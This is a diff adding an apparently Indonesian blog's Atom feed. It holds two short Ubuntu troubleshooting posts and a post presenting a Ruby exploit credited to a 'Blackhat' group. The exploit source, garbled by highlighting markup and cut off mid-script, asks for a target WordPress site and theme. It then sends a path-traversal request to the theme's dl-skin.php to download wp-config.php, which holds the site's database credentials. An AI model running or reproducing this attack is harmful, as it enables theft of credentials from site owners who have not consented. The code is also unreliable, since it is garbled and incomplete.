@@ -1,0 +1,555 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Ubuntu | SunDi3yansyah]]></title>
+  <link href="http://sundi3yansyah.com/article/categories/ubuntu/atom.xml" rel="self"/>
+  <link href="http://sundi3yansyah.com/"/>
+  <updated>2014-12-17T06:26:49+07:00</updated>
+  <id>http://sundi3yansyah.com/</id>
+  <author>
+    <name><![CDATA[SunDi3yansyah]]></name>
+    <email><![CDATA[sundi3yansyah@gmail.com]]></email>
+  </author>
+  <generator uri="https://ruby-lang.org/">Ruby</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Solusi Pesan “Error the Following Signatures Were Invalid” Pada Ubuntu]]></title>
+    <link href="http://sundi3yansyah.com/article/2014/11/16/solusi-pesan-error-the-following-signatures-were-invalid-pada-ubuntu/"/>
+    <updated>2014-11-16T18:05:17+07:00</updated>
+    <id>http://sundi3yansyah.com/article/2014/11/16/solusi-pesan-error-the-following-signatures-were-invalid-pada-ubuntu</id>
+    <content type="html"><![CDATA[<h4>Solusi Pesan Error &ldquo;The following signatures were invalid&rdquo; pada Ubuntu</h4>
+
+<p>Contohnya seperti apa?
+<code>sh
+Reading package lists... Done
+W: GPG error: http://extras.ubuntu.com precise Release: The following signatures were invalid: BADSIG 16126D3A3E5C1192 Ubuntu Extras Archive Automatic Signing Key &lt;ftpmaster@ubuntu.com&gt;
+</code></p>
+
+<!-- more -->
+
+
+<p>Cara mengatasinya:</p>
+
+<p>Buka terminal.</p>
+
+<p>Masuk sebagai root
+<code>sh
+sido -s
+</code>
+Masukin passowrdnya&hellip;</p>
+
+<p>NEXT:
+<code>sh
+apt-get clean
+</code>
+<code>sh
+mv /var/lib/apt/lists /tmp
+</code>
+<code>sh
+mkdir -p /var/lib/apt/lists/partial
+</code>
+<code>sh
+apt-get clean
+</code>
+<code>sh
+apt-get update
+</code></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Perbaiki Adobe Flash Player Issue Dalam Chromium Di Ubuntu 14.04]]></title>
+    <link href="http://sundi3yansyah.com/article/2014/11/11/perbaiki-adobe-flash-player-issue-dalam-chromium-di-ubuntu-14-dot-04/"/>
+    <updated>2014-11-11T04:41:38+07:00</updated>
+    <id>http://sundi3yansyah.com/article/2014/11/11/perbaiki-adobe-flash-player-issue-dalam-chromium-di-ubuntu-14-dot-04</id>
+    <content type="html"><![CDATA[<p>Salah satu dari beberapa yang pertama hal yang harus dilakukan setelah menginstal Ubuntu 14.04 adalah untuk menginstal Adobe Flash Player. Biasanya, jika Anda menginstal Ubuntu Restricted Extras, Flash Player harus bekerja dan Anda harus dapat menonton video online dari situs-situs seperti You Tube dll</p>
+
+<!-- more -->
+
+
+<p>Tapi ini tidak terjadi dengan Chromium dan Ubuntu 14.04 kombinasi. Meskipun Anda dapat dengan mudah bermain You Tube video dll di web browser lain seperti Firefox, Chrome dll, di Chromium Anda akan melihat Adobe Flash player hilang pemberitahuan:</p>
+
+<h6>Adobe Flash Player diperlukan untuk menampilkan beberapa elemen pada laman ini. Menginstal plug-in ..</h6>
+
+<p><img src="https://lh4.googleusercontent.com/-KdFNQ03VZSw/VGExfw4kUfI/AAAAAAAAAFw/x8bPUtGOLak/s800/Flash_Player_Ubuntu_1404_Chromium.jpeg" title="Perbaiki Adobe Flash Player Issue Dalam Chromium Di Ubuntu 14.04" alt="Perbaiki Adobe Flash Player Issue Dalam Chromium Di Ubuntu 14.04" /></p>
+
+<h4>Alasan untuk flash player masalah secara eksklusif di Chromium:</h4>
+
+<p>Alasan mengapa masalah ini terjadi hanya dalam Chromium adalah bahwa sampai sekarang Chromium digunakan Netscape Plugin API untuk dukungan Flash. Mulai dari Ubuntu 14.04, Chromium akan berhenti menggunakan Netscape Plugin API . Oleh karena itu, Anda akan menghadapi masalah dengan Adobe Flash Player dengan Chromium.</p>
+
+<p>Sekarang, mengapa masalah ini tidak terjadi dengan web browser lainnya? Jawabannya adalah karena mereka menggunakan Flash versi 11.2.</p>
+
+<h4>Perbaiki Adobe Flash Player masalah dengan Chromium:</h4>
+
+<p>Untuk memperbaiki masalah ini, kami akan menggunakan Lada Flash Player, versi yang lebih aman dan lebih stabil dari Flash Player dari Google. Sebuah installer Adobe Flash Player Lada tersedia di Ubuntu 14.04 repositori. Installer ini download Google Chrome, ekstrak lada Flash Player dan set up untuk penggunaan Chromium.</p>
+
+<p>Untuk menginstal Lada Flash Player di Ubuntu 14.04, buka terminal dan gunakan perintah berikut:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo apt-get install pepperflashplugin-nonfree</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Selanjutnya</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo update-pepperflashplugin-nonfree &ndash;install</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Restart Chromium. Tidak perlu reboot komputer/laptop anda. Saya harap posting ini cepat membantu Anda untuk memperbaiki Adobe Flash Player yang bermasalah dengan Chromium.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Exploit AFDFDE for Ruby]]></title>
+    <link href="http://sundi3yansyah.com/article/2014/08/26/exploit-afdfde-for-ruby/"/>
+    <updated>2014-08-26T23:17:19+07:00</updated>
+    <id>http://sundi3yansyah.com/article/2014/08/26/exploit-afdfde-for-ruby</id>
+    <content type="html"><![CDATA[<h2>ruby-AFDFDE</h2>
+
+<p><em>read this exploit <a href="https://github.com/SurabayaBlackhat/AFDFDE">AFDFDE</a></em></p>
+
+<h4>Require</h4>
+
+<ul>
+<li><a href="https://www.ruby-lang.org/en/downloads/">ruby</a></li>
+<li><a href="https://rubygems.org/pages/download">rubygems</a></li>
+<li><a href="https://rubygems.org/gems/curb">curb</a></li>
+</ul>
+
+
+<h4>Credit</h4>
+
+<ul>
+<li><a href="https://github.com/VicoErvanda">Vico Ervanda</a></li>
+<li><a href="https://github.com/SunDi3yansyah">SunDi3yansyah</a></li>
+<li>CaFc Versace</li>
+<li>Meninbox</li>
+<li>All Staff/Member SurabayaBlackhat</li>
+</ul>
+
+
+<!-- more -->
+
+
+<h4>License</h4>
+
+<p><a href="http://www.gnu.org/licenses/agpl-3.0.html">GNU Affero General Public License</a></p>
+
+<h3>Souce</h3>
+
+<p><figure class='code'><figcaption><span>ruby-AFDFDE.rb </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="o">&lt;</span><span class="sr">/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h1&gt;!/us</span><span class="n">r</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">ruby</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;require &amp;lsquo;curb&amp;rsquo;;</span>
+</span><span class='line'><span class="sr">require &amp;lsquo;fileutils&amp;rsquo;;</span>
+</span><span class='line'><span class="sr">require &amp;lsquo;uri&amp;rsquo;;&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">create</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;urlInvalid = false;</span>
+</span><span class='line'><span class="sr">themeInvalid = false;</span>
+</span><span class='line'><span class="sr">themeCollection = [&amp;ldquo;awake&amp;rdquo;,&amp;ldquo;construct&amp;rdquo;,&amp;ldquo;dejavu&amp;rdquo;,</span>
+</span><span class='line'><span class="sr">                    &amp;ldquo;echelon&amp;rdquo;,&amp;ldquo;elegance&amp;rdquo;,&amp;ldquo;fusion&amp;rdquo;,</span>
+</span><span class='line'><span class="sr">                        &amp;ldquo;infocus&amp;rdquo;,&amp;ldquo;megastream&amp;rdquo;,&amp;ldquo;method&amp;rdquo;,</span>
+</span><span class='line'><span class="sr">                            &amp;ldquo;modular&amp;rdquo;,&amp;ldquo;myriad&amp;rdquo;,&amp;ldquo;oakrealty&amp;rdquo;,&amp;ldquo;persuasion&amp;rdquo;];</span>
+</span><span class='line'><span class="sr">def valid?(url)</span>
+</span><span class='line'><span class="sr">    #url validator</span>
+</span><span class='line'><span class="sr">  uri = URI.parse(url)</span>
+</span><span class='line'><span class="sr">  uri.kind_of?(URI::HTTP)</span>
+</span><span class='line'><span class="sr">rescue URI::InvalidURIError</span>
+</span><span class='line'><span class="sr">  false</span>
+</span><span class='line'><span class="sr">end&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">coloring</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;def colorize(text, color_code)</span>
+</span><span class='line'><span class="sr">  &amp;ldquo;\e[</span><span class="si">#{</span><span class="n">color_code</span><span class="si">}</span><span class="sr">m</span><span class="si">#{</span><span class="n">text</span><span class="si">}</span><span class="sr">\e[0m&amp;rdquo;</span>
+</span><span class='line'><span class="sr">end&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">declare</span> <span class="n">the</span> <span class="n">color</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;def green(text); colorize(text, 32); end</span>
+</span><span class='line'><span class="sr">def red(text); colorize(text, 31); end</span>
+</span><span class='line'><span class="sr">def yellow(text); colorize(text, 33); end</span>
+</span><span class='line'><span class="sr">def blue(text); colorize(text, 34); end</span>
+</span><span class='line'><span class="sr">def purple(text); colorize(text, 35); end</span>
+</span><span class='line'><span class="sr">def cyan(text); colorize(text, 36); end&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="k">begin</span> <span class="n">step</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;puts cyan(&amp;ldquo;/</span><span class="o">/</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">kampoeng</span><span class="o">/</span><span class="n">ruby</span><span class="o">-</span><span class="no">AFDFDE</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>    <span class="p">:</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">red</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">ruby</span><span class="o">-</span><span class="no">AFDFDE</span> <span class="no">Repository</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">cyan</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="no">SurabayaBlackhat</span><span class="o">/</span><span class="no">AFDFDE</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span> <span class="p">:</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">red</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">Exploit</span> <span class="n">on</span> <span class="no">Github</span> <span class="no">SBH</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">cyan</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">//</span><span class="n">fb</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">freeeaks</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>                    <span class="p">:</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">purple</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">Vico</span> <span class="no">Ervanda</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">cyan</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">//</span><span class="n">fb</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">adiebiazajah</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>                <span class="p">:</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">purple</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">SunDi3yansyah</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">cyan</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">//</span><span class="n">fb</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="mi">100004896060156</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>             <span class="p">:</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">purple</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">CaFc</span> <span class="no">Versace</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">cyan</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">//</span><span class="n">kampoeng</span><span class="o">.</span><span class="n">co</span><span class="o">.</span><span class="n">id</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>                     <span class="p">:</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">green</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">Kampoeng</span> <span class="no">Network</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">n</span><span class="p">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;;</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">green</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">Theme</span> <span class="no">ID</span> <span class="p">:</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="mi">0</span><span class="o">.</span><span class="n">.</span><span class="mi">12</span>
+</span><span class='line'>    <span class="nb">puts</span> <span class="n">purple</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">to_s</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span> <span class="p">:</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">yellow</span><span class="p">(</span><span class="n">themeCollection</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">);</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'><span class="nb">puts</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;;</span>
+</span><span class='line'><span class="k">begin</span>
+</span><span class='line'>    <span class="c1">#trying to get a valid url</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">urlInvalid</span> <span class="o">==</span> <span class="kp">false</span>
+</span><span class='line'>        <span class="nb">puts</span> <span class="n">green</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">Tolong</span> <span class="n">masukan</span> <span class="n">url</span> <span class="n">yang</span> <span class="n">valid</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'>    <span class="k">else</span>
+</span><span class='line'>        <span class="nb">puts</span> <span class="n">red</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">url</span> <span class="n">tidak</span> <span class="n">valid</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'>    <span class="k">end</span>
+</span><span class='line'>    <span class="n">urlName</span> <span class="o">=</span> <span class="nb">gets</span><span class="o">.</span><span class="n">gsub</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">valid?</span><span class="p">(</span><span class="n">urlName</span><span class="p">)</span> <span class="o">===</span> <span class="kp">true</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">isUrlValid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">end</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">urlInvalid</span><span class="o">=</span><span class="kp">true</span><span class="p">;</span>
+</span><span class='line'><span class="k">end</span> <span class="k">while</span> <span class="n">isUrlValid</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h1&gt;url now valid, tell the user&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="nb">puts</span> <span class="n">yellow</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">Situs</span> <span class="n">yang</span> <span class="n">vulnerable</span> <span class="n">adalah</span> <span class="p">:</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="o">+</span> <span class="n">cyan</span><span class="p">(</span><span class="n">urlName</span><span class="p">);</span>
+</span><span class='line'><span class="k">begin</span>
+</span><span class='line'>    <span class="c1">#trying to get theme identifier</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">themeInvalid</span> <span class="o">==</span> <span class="kp">false</span>
+</span><span class='line'>        <span class="nb">puts</span> <span class="n">green</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">Tolong</span> <span class="n">masukan</span> <span class="n">tema</span> <span class="n">yang</span> <span class="n">digunakan</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;pre&gt;&lt;code&gt;else</span>
+</span><span class='line'><span class="sr">    puts red(&quot;tema tidak valid&quot;);</span>
+</span><span class='line'><span class="sr">end</span>
+</span><span class='line'><span class="sr">themeName = gets.gsub(&quot;\n&quot;,&quot;&quot;);</span>
+</span><span class='line'><span class="sr">if themeName.scan(/</span><span class="p">(</span><span class="o">[^</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="o">]+</span><span class="p">)</span><span class="o">/</span><span class="p">)</span><span class="o">.</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">themeName</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">themeName</span><span class="o">.</span><span class="n">to_i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">13</span> <span class="ow">and</span> <span class="n">themeName</span><span class="o">.</span><span class="n">to_i</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="o">-</span><span class="mi">1</span>
+</span><span class='line'>        <span class="n">isThemeValid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">end</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'><span class="n">themeInvalid</span> <span class="o">=</span> <span class="kp">true</span><span class="p">;</span>
+</span><span class='line'><span class="o">&lt;</span><span class="sr">/code&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="k">end</span> <span class="k">while</span> <span class="n">isThemeValid</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h1&gt;ok theme is valid, tell the user&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="nb">puts</span> <span class="n">yellow</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">Tema</span> <span class="n">yang</span> <span class="n">terpilih</span> <span class="n">adalah</span> <span class="p">:</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="o">+</span> <span class="n">cyan</span><span class="p">(</span><span class="n">themeCollection</span><span class="o">[</span><span class="n">themeName</span><span class="o">.</span><span class="n">to_i</span><span class="o">]</span><span class="p">);</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h1&gt;download the content using post method&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">c</span> <span class="o">=</span> <span class="no">Curl</span><span class="o">.</span><span class="n">post</span><span class="p">(</span> <span class="n">urlName</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">themes</span><span class="o">/&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">+</span><span class="n">themeCollection</span><span class="o">[</span><span class="n">themeName</span><span class="o">.</span><span class="n">to_i</span><span class="o">]</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">dl</span><span class="o">-</span><span class="n">skin</span><span class="o">.</span><span class="n">php</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,{</span>
+</span><span class='line'>                        <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">_mysite_download_skin</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">=&gt;</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">.</span><span class="n">.</span><span class="o">/.</span><span class="n">.</span><span class="o">/.</span><span class="n">.</span><span class="o">/.</span><span class="n">.</span><span class="o">/.</span><span class="n">.</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">config</span><span class="o">.</span><span class="n">php</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
+</span><span class='line'>                        <span class="p">})</span> <span class="k">do</span> <span class="o">|</span><span class="n">curl</span><span class="o">|</span>
+</span><span class='line'>        <span class="n">curl</span><span class="o">.</span><span class="n">ssl_verify_peer</span> <span class="o">=</span> <span class="kp">false</span>
+</span><span class='line'>        <span class="n">curl</span><span class="o">.</span><span class="n">headers</span><span class="o">[&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">User</span><span class="o">-</span><span class="no">Agent</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">BlackBerry</span><span class="o">/</span><span class="mi">3</span><span class="o">.</span><span class="mi">5</span><span class="o">.</span><span class="mi">0</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">end</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h1&gt;assign the result&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">text</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">body_str</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h1&gt;tell the user, what title we use for write to file&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
